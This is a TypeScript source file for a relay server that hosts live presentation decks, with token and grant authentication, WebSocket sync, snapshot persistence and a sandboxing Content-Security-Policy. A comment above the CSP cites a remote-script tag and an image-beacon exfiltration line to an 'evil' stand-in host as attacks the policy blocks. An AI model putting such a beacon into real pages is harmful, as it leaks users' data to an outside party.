import {
  Hub,
  createSession,
  roleForToken,
  injectBootstrap,
  injectWatermark,
  audienceScopeFromHtml,
  type Peer,
  type PeerRole,
  type Role,
  type Session,
} from "@liebstoeckel/live-server";
import { bearer, matchAccount, safeEqual } from "./auth";
import { mintGrant, verifyGrant } from "./grant";

/** Pluggable object storage for session snapshots (ADR 0061). The hosted deploy wires
 *  a Bun S3 client; the core stays storage-agnostic + testable. */
export interface RelayStorage {
  get(key: string): Promise<Uint8Array | null>;
  put(key: string, bytes: Uint8Array): Promise<void>;
}

export interface RelayOptions {
  /** pre-shared account API tokens; a POST must present one as `Bearer` */
  accountTokens: readonly string[];
  port?: number;
  hostname?: string;
  /** public base URL for the links we hand back (e.g. https://relay.example).
   *  Omitted → derived from the request (honors x-forwarded-proto/host). */
  publicBaseUrl?: string;
  /** max uploaded deck size (bytes) */
  maxDeckBytes?: number;
  /** max concurrent sessions per account */
  maxSessionsPerAccount?: number;
  /** session lifetime; the doc + tokens are dropped after this */
  sessionTtlMs?: number;
  /** inbound WS frame cap */
  maxFrameBytes?: number;
  /** keepalive period for each session Hub */
  keepaliveMs?: number;
  /** object storage for session snapshots (ADR 0061). Sessions created with an
   *  `x-snapshot-key` header are seeded from it on create and snapshotted to it on a
   *  timer + on end; absent → no persistence (the trusted/transient relay). */
  storage?: RelayStorage;
  /** snapshot debounce period (ms) for persisted sessions. */
  snapshotMs?: number;
  /** per-audience-peer write rate (enforced sessions). */
  audienceRate?: { capacity: number; refillPerSec: number };
}

interface RelaySession {
  id: string;
  account: string;
  hub: Hub;
  /** the built deck HTML (no bootstrap yet — injected per request) */
  html: string;
  session: Session;
  /** privileged peer token: the local deck-runner that applies server-plugin effects */
  runnerToken: string;
  createdAt: number;
  /** effective lifetime (ms) — the plan duration for hosted sessions (ADR 0061),
   *  else the relay default. */
  ttlMs: number;
  /** hosted live (ADR 0061): write-scope enforce audience peers. */
  enforce: boolean;
  /** max concurrent audience peers (plan's liveAudienceCap); undefined = uncapped. */
  audienceCap?: number;
  /** current connected audience peers (for the cap). */
  audienceCount: number;
  /** show the "Published with liebstoeckel" provenance badge (free tier; ADR 0061). */
  watermark: boolean;
  /** object-storage key for this session's Yjs snapshot, if persisted. */
  snapshotKey?: string;
  ttl?: ReturnType<typeof setTimeout>;
  snap?: ReturnType<typeof setInterval>;
}

export interface RelayServer {
  port: number;
  baseUrl: string;
  sessions: Map<string, RelaySession>;
  /** operational counters (ADR 0061 / ticket 0015) — snapshot write failures so a
   *  silently-lost result surfaces in logs/metrics instead of vanishing. */
  stats(): { snapshotFailures: number };
  /** Flush every active session's final snapshot, then tear down. Awaitable so a
   *  SIGTERM handler can guarantee the writes land before the process exits
   *  (ADR 0071 §5 / ticket 0018 — the racy fire-and-forget path lost results). */
  stop(): Promise<void>;
}

type WSData = { sessionId: string; peer: Peer | null; role: PeerRole };

const hex = (bytes = 16): string => {
  const a = new Uint8Array(bytes);
  crypto.getRandomValues(a);
  return Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
};

const DEFAULTS = {
  maxDeckBytes: 8 * 1024 * 1024,
  // Per-pod safety valve, NOT the platform ceiling (ADR 0071 §2 / ticket 0017): real
  // concurrency is gated by per-org entitlements + per-pod capacity in the control
  // plane's choosePod, and sessions spread across the StatefulSet's pods. This just
  // backstops a single pod's RAM.
  maxSessionsPerAccount: 200,
  sessionTtlMs: 6 * 60 * 60 * 1000,
  maxFrameBytes: 4 * 1024 * 1024,
  keepaliveMs: 25_000,
  snapshotMs: 20_000,
  audienceRate: { capacity: 20, refillPerSec: 5 },
};

/** Resolve the public http/ws origins for the links we return. */
function originOf(req: Request, opts: RelayOptions): { http: string; ws: string } {
  if (opts.publicBaseUrl) {
    const b = opts.publicBaseUrl.replace(/\/$/, "");
    return { http: b, ws: b.replace(/^http/i, "ws") };
  }
  const url = new URL(req.url);
  const proto = req.headers.get("x-forwarded-proto") ?? (url.protocol === "https:" ? "https" : "http");
  const host = req.headers.get("x-forwarded-host") ?? url.host;
  return { http: `${proto}://${host}`, ws: `${proto === "https" ? "wss" : "ws"}://${host}` };
}

const json = (body: unknown, status = 200): Response =>
  new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

/** Resolve a session's role for a token: presenter/viewer (public) or runner
 *  (the privileged deck-runner peer). null = deny. */
function relayRole(s: RelaySession, token: string | null): Role | "runner" | null {
  if (!token) return null;
  if (safeEqual(s.runnerToken, token)) return "runner";
  return roleForToken(s.session, token);
}

/** Resolve a connection's role from `?t=…`, preferring a **signed grant** (ADR 0061):
 *  the control plane mints presenter/viewer grants the relay verifies statelessly with
 *  the session's account token — no per-session token lookup. Falls back to the raw
 *  session tokens (CLI presenter/viewer) and the runner token. null = deny. */
function resolveRole(s: RelaySession, token: string | null, now: number): Role | "runner" | null {
  if (!token) return null;
  const g = verifyGrant(token, s.account, now);
  if (g && g.session === s.id && (g.role === "presenter" || g.role === "viewer")) return g.role;
  return relayRole(s, token);
}

/** A public relay: account-token-gated deck upload, opaque-origin deck serving,
 *  and a token-gated Yjs WebSocket per session. Decks run their code locally (the
 *  runner connects as a privileged peer); the relay only relays + serves bytes. */
export function createRelay(opts: RelayOptions): RelayServer {
  const cfg = { ...DEFAULTS, ...opts };
  if (!opts.accountTokens.length) throw new Error("createRelay: at least one account token is required");
  const sessions = new Map<string, RelaySession>();
  let snapshotFailures = 0;

  const persist = async (s: RelaySession) => {
    if (!cfg.storage || !s.snapshotKey) return;
    try {
      await cfg.storage.put(s.snapshotKey, s.hub.snapshot());
    } catch (e) {
      // Best-effort: a failed write must never crash the relay — but it must NOT be
      // silent (results would vanish). Structured log + a counter (ADR 0061).
      snapshotFailures++;
      console.error(
        JSON.stringify({ level: "error", msg: "relay snapshot persist failed", key: s.snapshotKey, err: String(e) }),
      );
    }
  };

  const dropSession = (s: RelaySession) => {
    if (s.ttl) clearTimeout(s.ttl);
    if (s.snap) clearInterval(s.snap);
    sessions.delete(s.id);
    // Snapshot the final state before tearing down the doc (results survive — ADR 0061).
    void persist(s).finally(() => s.hub.destroy());
  };

  const server = Bun.serve<WSData>({
    port: opts.port ?? 0,
    hostname: opts.hostname ?? "0.0.0.0",
    async fetch(req, srv) {
      const url = new URL(req.url);
      const { pathname } = url;

      if (pathname === "/healthz") return new Response("ok");

      // --- fleet stats: this pod's live load, for control-plane placement ----
      // (ADR 0071 §2 / ticket 0017). Account-gated because the per-pod Ingress makes
      // it publicly reachable; only the control plane (with the account token) reads it.
      if (pathname === "/stats") {
        if (!matchAccount(cfg.accountTokens, bearer(req))) return json({ error: "unauthorized" }, 401);
        return json({ ok: true, sessions: sessions.size });
      }

      // --- control API: create a session by uploading a deck ---------------
      if (pathname === "/api/sessions" && req.method === "POST") {
        const account = matchAccount(cfg.accountTokens, bearer(req));
        if (!account) return json({ error: "unauthorized" }, 401);

        const declared = Number(req.headers.get("content-length") ?? "0");
        if (declared > cfg.maxDeckBytes) return json({ error: "deck too large" }, 413);
        const html = await req.text();
        if (Buffer.byteLength(html, "utf8") > cfg.maxDeckBytes) return json({ error: "deck too large" }, 413);
        if (!html.trim()) return json({ error: "empty deck" }, 400);

        const count = [...sessions.values()].filter((s) => s.account === account).length;
        if (count >= cfg.maxSessionsPerAccount) return json({ error: "session quota reached" }, 429);

        // Hosted live (ADR 0061): the control plane opts a session into audience
        // write-scope enforcement (scope read from the deck's own embedded manifest)
        // and names the object-storage key its Yjs snapshot persists to.
        const enforce = req.headers.get("x-live-enforce") === "1";
        const snapshotKey = req.headers.get("x-snapshot-key") || undefined;
        // Plan limits the control plane passes per session (ADR 0061): the duration
        // (so a free session's link dies on time, not at the relay's 6h default) and
        // the audience cap. TTL is clamped to the relay max; absent → relay default.
        const reqTtl = Number(req.headers.get("x-session-ttl-ms") ?? "");
        const ttlMs = Number.isFinite(reqTtl) && reqTtl > 0 ? Math.min(reqTtl, cfg.sessionTtlMs) : cfg.sessionTtlMs;
        const capHdr = Number(req.headers.get("x-audience-cap") ?? "");
        const audienceCap = Number.isFinite(capHdr) && capHdr > 0 ? capHdr : undefined;
        const watermark = req.headers.get("x-watermark") === "1";

        const session = createSession();
        const hub = new Hub({
          keepaliveMs: cfg.keepaliveMs,
          audience: enforce ? { scope: audienceScopeFromHtml(html), rate: cfg.audienceRate } : undefined,
        });
        // Re-seed from a prior snapshot if one exists (relay restart / reconnect).
        if (cfg.storage && snapshotKey) {
          try {
            const prior = await cfg.storage.get(snapshotKey);
            if (prior) hub.seed(prior);
          } catch {
            /* no prior snapshot / unreadable → start fresh */
          }
        }
        const rs: RelaySession = {
          id: session.id,
          account,
          hub,
          html,
          session,
          runnerToken: hex(),
          createdAt: Date.now(),
          ttlMs,
          enforce,
          audienceCap,
          audienceCount: 0,
          watermark,
          snapshotKey,
        };
        rs.ttl = setTimeout(() => dropSession(rs), ttlMs);
        (rs.ttl as { unref?: () => void }).unref?.();
        if (cfg.storage && snapshotKey) {
          rs.snap = setInterval(() => void persist(rs), cfg.snapshotMs);
          (rs.snap as { unref?: () => void }).unref?.();
        }
        sessions.set(rs.id, rs);

        // Mint signed, expiring presenter/viewer grants (ADR 0061) — the links carry
        // these, and the relay verifies them statelessly with the account token; no
        // per-session token is stored client-side. (Raw tokens are still returned for
        // CLI/runner back-compat.)
        const exp = rs.createdAt + ttlMs;
        const presenterGrant = mintGrant({ session: rs.id, role: "presenter", exp }, account);
        const viewerGrant = mintGrant({ session: rs.id, role: "viewer", exp }, account);

        const { http, ws } = originOf(req, opts);
        return json({
          id: rs.id,
          presenterToken: session.presenterToken,
          viewerToken: session.viewerToken,
          runnerToken: rs.runnerToken,
          presenterGrant,
          viewerGrant,
          expiresAt: exp,
          urls: {
            presenter: `${http}/s/${rs.id}?t=${presenterGrant}`,
            viewer: `${http}/s/${rs.id}?t=${viewerGrant}`,
            sync: `${ws}/sync/${rs.id}`,
          },
        });
      }

      // --- control API: end a session (owner only) -------------------------
      const del = pathname.match(/^\/api\/sessions\/([^/]+)$/);
      if (del && req.method === "DELETE") {
        const account = matchAccount(cfg.accountTokens, bearer(req));
        if (!account) return json({ error: "unauthorized" }, 401);
        const s = sessions.get(del[1]!);
        if (!s || s.account !== account) return json({ error: "not found" }, 404);
        dropSession(s);
        return new Response(null, { status: 204 });
      }

      // --- WebSocket sync --------------------------------------------------
      const sync = pathname.match(/^\/sync\/([^/]+)$/);
      if (sync) {
        const s = sessions.get(sync[1]!);
        const relRole = s ? resolveRole(s, url.searchParams.get("t"), Date.now()) : null;
        if (!s || !relRole) {
          return new Response("forbidden", { status: 403 });
        }
        // viewer → audience (write-scope enforced when the session opted in);
        // presenter + runner are trusted writers.
        const role: PeerRole = relRole === "viewer" ? "audience" : "presenter";
        // Enforce the plan's audience cap (ADR 0061) — presenter/runner never count.
        if (role === "audience" && s.audienceCap !== undefined && s.audienceCount >= s.audienceCap) {
          return new Response("audience full", { status: 503 });
        }
        const data: WSData = { sessionId: s.id, peer: null, role };
        return srv.upgrade(req, { data }) ? undefined : new Response("upgrade failed", { status: 400 });
      }

      // --- serve the deck in an opaque sandbox -----------------------------
      const serve = pathname.match(/^\/s\/([^/]+)$/);
      if (serve) {
        const s = sessions.get(serve[1]!);
        const token = url.searchParams.get("t");
        const role = s ? resolveRole(s, token, Date.now()) : null;
        // runner token must not load the page (it's WS-only)
        if (!s || !role || role === "runner" || !token) {
          return new Response("Invalid or expired link.", { status: 403 });
        }
        const { http, ws } = originOf(req, opts);
        const wsUrl = `${ws}/sync/${s.id}?t=${token}`;
        const viewer = `${http}/s/${s.id}?t=${s.session.viewerToken}`;
        // Free-tier provenance badge on the public audience view (ADR 0061); paid
        // (white-label) sessions omit it. Presenter view is never watermarked.
        const html = s.watermark && role === "viewer" ? injectWatermark(s.html) : s.html;
        const body = injectBootstrap(html, { ws: wsUrl, session: s.id, role, token, participant: "", viewer });
        return new Response(body, {
          headers: {
            "content-type": "text/html; charset=utf-8",
            // Opaque-origin isolation: no allow-same-origin → the deck can't reach
            // the relay's cookies/API/DOM, and each load is a fresh opaque origin
            // (deck-to-deck isolation). connect-src pins the live socket to us.
            // `allow-popups` enables the presenter pop-out (P → window.open of
            // /s/:id?t=<presenterToken>#presenter) — the popup is itself served
            // sandboxed by the relay and syncs through the Hub, so isolation holds
            // (ADR 0014). Without it window.open throws in the sandbox.
            // `allow-fullscreen` is NOT a valid CSP `sandbox` token (it's an
            // iframe/Permissions-Policy feature) — browsers reject it and log a
            // console error. Fullscreen for this top-level doc is governed by the
            // Fullscreen API / Permissions-Policy, not the sandbox directive.
            //
            // `default-src 'none'` + a single-file allowlist (ADR 0069): a deck
            // inlines all assets (ADR 0001), so it needs zero external origins —
            // this blocks remote code (`<script src=evil>`) and GET-beacon exfil
            // (`new Image().src='https://evil/?x'`) that `connect-src` can't pin.
            // Mirrors the dashboard's static-share CSP, but keeps `connect-src`
            // to our sync socket and `allow-popups` for the presenter pop-out.
            "content-security-policy": `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src ${ws} ${http}; frame-ancestors 'none'; sandbox allow-scripts allow-popups`,
            "x-content-type-options": "nosniff",
            "referrer-policy": "no-referrer",
          },
        });
      }

      return new Response("not found", { status: 404 });
    },
    websocket: {
      idleTimeout: 120,
      maxPayloadLength: cfg.maxFrameBytes,
      open(socket) {
        const s = sessions.get(socket.data.sessionId);
        if (!s) {
          socket.close();
          return;
        }
        if (socket.data.role === "audience") s.audienceCount++;
        socket.data.peer = s.hub.join((d) => socket.send(d), socket.data.role);
      },
      message(socket, msg) {
        if (typeof msg === "string") return;
        const bytes = new Uint8Array(msg as unknown as ArrayBufferLike);
        if (bytes.byteLength > cfg.maxFrameBytes) return;
        socket.data.peer?.recv(bytes);
      },
      close(socket) {
        socket.data.peer?.leave();
        const s = sessions.get(socket.data.sessionId);
        if (s && socket.data.role === "audience" && s.audienceCount > 0) s.audienceCount--;
      },
    },
  });

  const port = server.port ?? 0;
  return {
    port,
    baseUrl: opts.publicBaseUrl?.replace(/\/$/, "") ?? `http://${opts.hostname ?? "0.0.0.0"}:${port}`,
    sessions,
    stats: () => ({ snapshotFailures }),
    async stop() {
      const active = [...sessions.values()];
      // Flush every active session's final snapshot and AWAIT the writes before
      // tearing down. The old path fired `dropSession` (un-awaited persist) then
      // returned, so a SIGTERM + process.exit raced the S3 PUTs and lost the last
      // interval's state. Now a graceful shutdown is lossless (ADR 0071 §5).
      await Promise.allSettled(active.map((s) => persist(s)));
      for (const s of active) {
        if (s.ttl) clearTimeout(s.ttl);
        if (s.snap) clearInterval(s.snap);
        sessions.delete(s.id);
        s.hub.destroy();
      }
      server.stop(true);
    },
  };
}
